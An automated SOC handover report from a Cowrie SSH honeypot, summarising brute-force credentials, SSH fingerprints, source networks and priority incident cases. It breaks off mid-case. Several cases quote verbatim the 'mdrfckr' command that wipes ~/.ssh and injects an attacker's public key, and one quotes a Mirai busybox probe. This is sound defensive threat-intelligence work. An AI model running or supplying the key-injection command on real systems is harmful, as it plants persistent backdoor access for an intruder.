# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-03 |
| **Generated At** | 2026-04-03T22:31:23Z |
| **Shift Time** | 22:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **74** |
| Confirmed Threats | **64** |
| False Positives Filtered | **10** (13.5%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **19** |
| High Severity Cases | **24** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **22** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 10 |
| `ubuntu` | 2 |
| `steam` | 2 |
| `unknown` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `test` | 3 |
| `909090` | 2 |
| `a123456789j` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `909090` | 2 |
| `ubuntu` | `a123456789j` | 2 |
| `root` | `CCzz000` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `909090` | `118.193.34.157` | 2026-04-03T20:35:31 |
| `root` | `3245gs5662d34` | `118.193.34.157` | 2026-04-03T20:35:34 |
| `root` | `CCzz000` | `118.193.34.157` | 2026-04-03T20:40:03 |
| `root` | `909090` | `186.251.71.202` | 2026-04-03T20:44:06 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-04-03T20:44:13 |
| `root` | `qwe_1234` | `186.251.71.202` | 2026-04-03T20:48:18 |
| `root` | `A123456789J` | `186.251.71.202` | 2026-04-03T20:52:29 |
| `root` | `sftpuser` | `186.251.71.202` | 2026-04-03T21:08:47 |
| `root` | `QWERTYUIOP2024` | `186.251.71.202` | 2026-04-03T21:17:08 |
| `root` | `ttnet` | `121.142.70.6` | 2026-04-03T21:22:01 |
| `root` | `CCzz000` | `186.251.71.202` | 2026-04-03T21:33:30 |
| `root` | `root666@@` | `186.251.71.202` | 2026-04-03T21:49:45 |
| `root` | `password` | `179.43.186.241` | 2026-04-03T21:58:45 |
| `root` | `44` | `101.13.2.183` | 2026-04-03T21:59:59 |
| `root` | `44` | `118.123.116.93` | 2026-04-03T22:00:08 |
| `root` | `Root12..` | `51.68.226.87` | 2026-04-03T22:01:03 |
| `root` | `3245gs5662d34` | `51.68.226.87` | 2026-04-03T22:01:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **74** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 46 |
| OpenSSH | 13 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 45 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 13 | 13 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 45 | 5 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 13 | 13 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1592, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox MKGSO
```
Source IPs: `121.142.70.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.251.71.202`, `51.68.226.87`, `118.193.34.157`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **29** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS199739` | Earthlink Telecommunications Equipment Trading & Services DMCC | 1 | LOW |
| `AS25159` | PJSC MegaFon | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS14754` | TELECOMUNICACIONES DE GUATEMALA, SOCIEDAD ANONIMA | 1 | HIGH |
| `AS212512` | Detai Prosperous Technologies Limited | 1 | LOW |
| `AS24158` | Taiwan Mobile Co., Ltd. | 1 | HIGH |
| `AS51852` | Private Layer INC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (24)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-efdb09b926f2

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:35 |
| **Last Seen** | 2026-04-03 20:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:35:31` | `cowrie.session.connect` |
| `2026-04-03 20:35:31` | `cowrie.client.version` |
| `2026-04-03 20:35:31` | `cowrie.client.kex` |
| `2026-04-03 20:35:31` | `cowrie.login.success` |
| `2026-04-03 20:35:31` | `cowrie.session.params` |
| `2026-04-03 20:35:31` | `cowrie.command.input` |
| `2026-04-03 20:35:31` | `cowrie.command.failed` |
| `2026-04-03 20:35:32` | `cowrie.log.closed` |
| `2026-04-03 20:35:32` | `cowrie.session.params` |
| `2026-04-03 20:35:32` | `cowrie.command.input` |
| `2026-04-03 20:35:32` | `cowrie.session.file_download` |
| `2026-04-03 20:35:32` | `cowrie.log.closed` |
| `2026-04-03 20:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10dafca9afa9

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:35 |
| **Last Seen** | 2026-04-03 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:35:34` | `cowrie.session.connect` |
| `2026-04-03 20:35:34` | `cowrie.client.version` |
| `2026-04-03 20:35:34` | `cowrie.client.kex` |
| `2026-04-03 20:35:34` | `cowrie.login.success` |
| `2026-04-03 20:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bbc885c46a0

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:40 |
| **Last Seen** | 2026-04-03 20:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:40:02` | `cowrie.session.connect` |
| `2026-04-03 20:40:02` | `cowrie.client.version` |
| `2026-04-03 20:40:02` | `cowrie.client.kex` |
| `2026-04-03 20:40:03` | `cowrie.login.success` |
| `2026-04-03 20:40:03` | `cowrie.session.params` |
| `2026-04-03 20:40:03` | `cowrie.command.input` |
| `2026-04-03 20:40:03` | `cowrie.command.failed` |
| `2026-04-03 20:40:03` | `cowrie.log.closed` |
| `2026-04-03 20:40:03` | `cowrie.session.params` |
| `2026-04-03 20:40:03` | `cowrie.command.input` |
| `2026-04-03 20:40:03` | `cowrie.session.file_download` |
| `2026-04-03 20:40:03` | `cowrie.log.closed` |
| `2026-04-03 20:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c926817dc650

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:40 |
| **Last Seen** | 2026-04-03 20:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:40:05` | `cowrie.session.connect` |
| `2026-04-03 20:40:05` | `cowrie.client.version` |
| `2026-04-03 20:40:05` | `cowrie.client.kex` |
| `2026-04-03 20:40:06` | `cowrie.login.success` |
| `2026-04-03 20:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7ef5711f21

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:44 |
| **Last Seen** | 2026-04-03 20:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:44:04` | `cowrie.session.connect` |
| `2026-04-03 20:44:04` | `cowrie.client.version` |
| `2026-04-03 20:44:04` | `cowrie.client.kex` |
| `2026-04-03 20:44:06` | `cowrie.login.success` |
| `2026-04-03 20:44:07` | `cowrie.session.params` |
| `2026-04-03 20:44:07` | `cowrie.command.input` |
| `2026-04-03 20:44:07` | `cowrie.command.failed` |
| `2026-04-03 20:44:07` | `cowrie.log.closed` |
| `2026-04-03 20:44:08` | `cowrie.session.params` |
| `2026-04-03 20:44:08` | `cowrie.command.input` |
| `2026-04-03 20:44:08` | `cowrie.session.file_download` |
| `2026-04-03 20:44:08` | `cowrie.log.closed` |
| `2026-04-03 20:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef2cf72b823

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:44 |
| **Last Seen** | 2026-04-03 20:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:44:12` | `cowrie.session.connect` |
| `2026-04-03 20:44:12` | `cowrie.client.version` |
| `2026-04-03 20:44:12` | `cowrie.client.kex` |
| `2026-04-03 20:44:13` | `cowrie.login.success` |
| `2026-04-03 20:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b110174363a3

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:48 |
| **Last Seen** | 2026-04-03 20:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:48:16` | `cowrie.session.connect` |
| `2026-04-03 20:48:16` | `cowrie.client.version` |
| `2026-04-03 20:48:16` | `cowrie.client.kex` |
| `2026-04-03 20:48:18` | `cowrie.login.success` |
| `2026-04-03 20:48:18` | `cowrie.session.params` |
| `2026-04-03 20:48:18` | `cowrie.command.input` |
| `2026-04-03 20:48:18` | `cowrie.command.failed` |
| `2026-04-03 20:48:19` | `cowrie.log.closed` |
| `2026-04-03 20:48:19` | `cowrie.session.params` |
| `2026-04-03 20:48:19` | `cowrie.command.input` |
| `2026-04-03 20:48:20` | `cowrie.session.file_download` |
| `2026-04-03 20:48:20` | `cowrie.log.closed` |
| `2026-04-03 20:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1810dc4d1b9

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:48 |
| **Last Seen** | 2026-04-03 20:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:48:23` | `cowrie.session.connect` |
| `2026-04-03 20:48:23` | `cowrie.client.version` |
| `2026-04-03 20:48:24` | `cowrie.client.kex` |
| `2026-04-03 20:48:25` | `cowrie.login.success` |
| `2026-04-03 20:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d4668d6ec9

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:52 |
| **Last Seen** | 2026-04-03 20:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:52:27` | `cowrie.session.connect` |
| `2026-04-03 20:52:27` | `cowrie.client.version` |
| `2026-04-03 20:52:27` | `cowrie.client.kex` |
| `2026-04-03 20:52:29` | `cowrie.login.success` |
| `2026-04-03 20:52:29` | `cowrie.session.params` |
| `2026-04-03 20:52:29` | `cowrie.command.input` |
| `2026-04-03 20:52:29` | `cowrie.command.failed` |
| `2026-04-03 20:52:30` | `cowrie.log.closed` |
| `2026-04-03 20:52:30` | `cowrie.session.params` |
| `2026-04-03 20:52:30` | `cowrie.command.input` |
| `2026-04-03 20:52:31` | `cowrie.session.file_download` |
| `2026-04-03 20:52:31` | `cowrie.log.closed` |
| `2026-04-03 20:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f179b3b5a6

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:52 |
| **Last Seen** | 2026-04-03 20:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:52:34` | `cowrie.session.connect` |
| `2026-04-03 20:52:34` | `cowrie.client.version` |
| `2026-04-03 20:52:35` | `cowrie.client.kex` |
| `2026-04-03 20:52:36` | `cowrie.login.success` |
| `2026-04-03 20:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2dac9c0f67e

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:08 |
| **Last Seen** | 2026-04-03 21:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:08:46` | `cowrie.session.connect` |
| `2026-04-03 21:08:46` | `cowrie.client.version` |
| `2026-04-03 21:08:46` | `cowrie.client.kex` |
| `2026-04-03 21:08:47` | `cowrie.login.success` |
| `2026-04-03 21:08:48` | `cowrie.session.params` |
| `2026-04-03 21:08:48` | `cowrie.command.input` |
| `2026-04-03 21:08:48` | `cowrie.command.failed` |
| `2026-04-03 21:08:49` | `cowrie.log.closed` |
| `2026-04-03 21:08:49` | `cowrie.session.params` |
| `2026-04-03 21:08:49` | `cowrie.command.input` |
| `2026-04-03 21:08:50` | `cowrie.session.file_download` |
| `2026-04-03 21:08:50` | `cowrie.log.closed` |
| `2026-04-03 21:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132d74d31e1a

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:08 |
| **Last Seen** | 2026-04-03 21:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:08:53` | `cowrie.session.connect` |
| `2026-04-03 21:08:53` | `cowrie.client.version` |
| `2026-04-03 21:08:54` | `cowrie.client.kex` |
| `2026-04-03 21:08:55` | `cowrie.login.success` |
| `2026-04-03 21:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d405e67a245c

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:17 |
| **Last Seen** | 2026-04-03 21:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:17:06` | `cowrie.session.connect` |
| `2026-04-03 21:17:06` | `cowrie.client.version` |
| `2026-04-03 21:17:06` | `cowrie.client.kex` |
| `2026-04-03 21:17:08` | `cowrie.login.success` |
